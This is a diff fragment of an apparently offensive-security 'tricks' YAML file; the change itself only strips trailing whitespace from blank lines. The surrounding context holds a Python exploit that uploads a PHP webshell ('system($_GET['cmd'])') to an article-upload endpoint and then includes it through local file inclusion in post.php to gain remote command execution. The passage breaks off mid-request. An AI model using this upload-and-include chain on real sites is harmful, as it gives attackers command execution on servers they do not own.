@@ -36,16 +36,16 @@ tricks:
     how: "Upload shell -> LFI include -> RCE"
     payload: |
       import requests, re
-      
+
       TARGET = "http://TARGET"
       s = requests.Session()
-      
+
       # Upload webshell
       shell = b"<?php system($_GET['cmd']); ?>"
       files = {"articleFile": ("shell.php", shell, "application/x-php")}
       data = {"name": "test", "email": "test@test.com"}
       s.post(f"{TARGET}/posts/upload-article.php", files=files, data=data)
-      
+
       # LFI include and execute command
       resp = s.get(f"{TARGET}/post.php", params={
           "id": "uploads/shell",
